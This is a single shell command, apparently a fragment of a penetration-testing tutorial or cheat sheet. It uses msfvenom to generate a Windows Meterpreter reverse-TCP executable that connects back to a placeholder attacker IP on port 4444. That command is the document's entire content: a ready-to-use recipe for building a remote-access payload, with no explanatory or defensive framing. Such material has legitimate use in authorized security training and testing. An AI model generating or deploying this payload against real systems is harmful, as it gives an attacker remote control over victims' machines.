            $ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe


